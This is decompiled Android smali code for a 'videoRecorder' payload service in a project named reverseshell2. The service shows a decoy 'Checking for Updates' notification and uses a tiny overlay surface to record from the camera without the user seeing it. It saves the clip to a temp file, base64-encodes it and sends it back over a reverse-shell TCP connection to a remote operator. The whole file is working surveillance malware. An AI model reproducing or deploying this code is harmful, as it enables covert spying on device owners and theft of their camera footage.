.class public Lcom/example/reverseshell2/Payloads/videoRecorder;
.super Landroid/app/Service;
.source "videoRecorder.java"


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private mediaRecorder:Landroid/media/MediaRecorder;

.field private surfaceView:Landroid/view/SurfaceView;

.field videoFile:Ljava/io/File;

.field private windowManager:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 43
    const-string v0, "videoRecoderClass"

    sput-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 37
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 41
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    .line 42
    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    return-void
.end method

.method static synthetic access$000(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/hardware/Camera;
    .locals 1
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 37
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    return-object v0
.end method

.method static synthetic access$002(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/hardware/Camera;)Landroid/hardware/Camera;
    .locals 0
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;
    .param p1, "x1"    # Landroid/hardware/Camera;

    .line 37
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    return-object p1
.end method

.method static synthetic access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;
    .locals 1
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 37
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    return-object v0
.end method

.method static synthetic access$102(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/media/MediaRecorder;)Landroid/media/MediaRecorder;
    .locals 0
    .param p0, "x0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;
    .param p1, "x1"    # Landroid/media/MediaRecorder;

    .line 37
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    return-object p1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 275
    const/4 v0, 0x0

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .line 50
    const-string v0, "ins"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 51
    .local v0, "ins":Ljava/lang/String;
    const-string v1, "startFore"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    const/4 v2, 0x1

    if-eqz v1, :cond_0

    .line 53
    new-instance v1, Lcom/example/reverseshell2/functions;

    const/4 v3, 0x0

    invoke-direct {v1, v3}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v1, v3}, Lcom/example/reverseshell2/functions;->createNotiChannel(Landroid/content/Context;)V

    .line 54
    new-instance v1, Landroidx/core/app/NotificationCompat$Builder;

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "channelid"

    invoke-direct {v1, v3, v4}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 55
    const-string v3, "Checking for Updates"

    invoke-virtual {v1, v3}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    .line 56
    const-string v3, "Fetching"

    invoke-virtual {v1, v3}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    const v3, 0x7f060056

    .line 57
    invoke-virtual {v1, v3}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    .line 58
    const/4 v3, 0x0

    invoke-virtual {v1, v3, v3, v2}, Landroidx/core/app/NotificationCompat$Builder;->setProgress(IIZ)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    .line 59
    invoke-virtual {v1}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    .line 60
    .local v1, "notification":Landroid/app/Notification;
    const/16 v3, 0x4d2

    invoke-virtual {p0, v3, v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->startForeground(ILandroid/app/Notification;)V

    .line 61
    const-string v3, "cameraid"

    invoke-virtual {p1, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 62
    .local v3, "id":Ljava/lang/String;
    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    sget-object v5, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {p0, v4, v5}, Lcom/example/reverseshell2/Payloads/videoRecorder;->startVideo(ILjava/io/OutputStream;)V

    .line 64
    .end local v1    # "notification":Landroid/app/Notification;
    .end local v3    # "id":Ljava/lang/String;
    :cond_0
    const-string v1, "stopFore"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 66
    sget-object v1, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {p0, v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoStop(Ljava/io/OutputStream;)V

    .line 68
    :cond_1
    return v2
.end method

.method public sendData(Ljava/io/File;Ljava/io/OutputStream;)V
    .locals 6
    .param p1, "file"    # Ljava/io/File;
    .param p2, "outputStream"    # Ljava/io/OutputStream;

    .line 238
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$5;

    invoke-direct {v1, p0, p2}, Lcom/example/reverseshell2/Payloads/videoRecorder$5;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 247
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 248
    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int v1, v0

    .line 249
    .local v1, "size":I
    new-array v0, v1, [B

    .line 251
    .local v0, "data":[B
    :try_start_0
    new-instance v2, Ljava/io/BufferedInputStream;

    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 252
    .local v2, "buf":Ljava/io/BufferedInputStream;
    array-length v3, v0

    const/4 v4, 0x0

    invoke-virtual {v2, v0, v4, v3}, Ljava/io/BufferedInputStream;->read([BII)I

    .line 253
    sget-object v3, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v3, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 254
    invoke-static {v0, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v3

    .line 255
    .local v3, "encodedVideo":Ljava/lang/String;
    new-instance v4, Ljava/lang/Thread;

    new-instance v5, Lcom/example/reverseshell2/Payloads/videoRecorder$6;

    invoke-direct {v5, p0, p2, v3}, Lcom/example/reverseshell2/Payloads/videoRecorder$6;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;Ljava/lang/String;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 267
    invoke-virtual {v4}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 269
    .end local v2    # "buf":Ljava/io/BufferedInputStream;
    .end local v3    # "encodedVideo":Ljava/lang/String;
    goto :goto_0

    .line 268
    :catch_0
    move-exception v2

    .line 270
    :goto_0
    return-void
.end method

.method public startVideo(ILjava/io/OutputStream;)V
    .locals 9
    .param p1, "cameraID"    # I
    .param p2, "outputStream"    # Ljava/io/OutputStream;

    .line 75
    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    .line 77
    .local v0, "outputDir":Ljava/io/File;
    :try_start_0
    const-string v1, "sound"

    const-string v2, ".mp4"

    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v1

    iput-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 80
    goto :goto_0

    .line 78
    :catch_0
    move-exception v1

    .line 79
    .local v1, "e":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    .line 82
    .end local v1    # "e":Ljava/io/IOException;
    :goto_0
    const-string v1, "window"

    invoke-virtual {p0, v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    iput-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->windowManager:Landroid/view/WindowManager;

    .line 83
    new-instance v1, Landroid/view/SurfaceView;

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    .line 84
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v4, 0x1

    const/4 v5, 0x1

    const/16 v6, 0x7d5

    const/high16 v7, 0x40000

    const/4 v8, -0x3

    move-object v3, v1

    invoke-direct/range {v3 .. v8}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 90
    .local v1, "layoutParams":Landroid/view/WindowManager$LayoutParams;
    const/16 v2, 0x33

    iput v2, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 92
    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->windowManager:Landroid/view/WindowManager;

    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    invoke-interface {v2, v3, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 93
    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    invoke-virtual {v2}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v2

    new-instance v3, Lcom/example/reverseshell2/Payloads/videoRecorder$1;

    invoke-direct {v3, p0, p1, p2}, Lcom/example/reverseshell2/Payloads/videoRecorder$1;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;ILjava/io/OutputStream;)V

    invoke-interface {v2, v3}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 177
    return-void
.end method

.method public videoStop(Ljava/io/OutputStream;)V
    .locals 5
    .param p1, "outputStream"    # Ljava/io/OutputStream;

    .line 180
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_1

    .line 182
    :try_start_0
    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0

    .line 195
    goto :goto_0

    .line 183
    :catch_0
    move-exception v0

    .line 184
    .local v0, "e":Ljava/lang/IllegalStateException;
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/example/reverseshell2/Payloads/videoRecorder$2;

    invoke-direct {v2, p0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder$2;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 194
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 196
    .end local v0    # "e":Ljava/lang/IllegalStateException;
    :goto_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->reset()V

    .line 197
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 198
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->lock()V

    .line 199
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 200
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->windowManager:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->surfaceView:Landroid/view/SurfaceView;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 202
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/16 v2, 0x0

    cmp-long v4, v0, v2

    if-eqz v4, :cond_0

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 203
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {p0, v0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->sendData(Ljava/io/File;Ljava/io/OutputStream;)V

    goto :goto_1

    .line 205
    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$3;

    invoke-direct {v1, p0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder$3;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 220
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 222
    :goto_1
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    goto :goto_2

    .line 224
    :cond_1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$4;

    invoke-direct {v1, p0, p1}, Lcom/example/reverseshell2/Payloads/videoRecorder$4;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 233
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 235
    :goto_2
    return-void
.end method
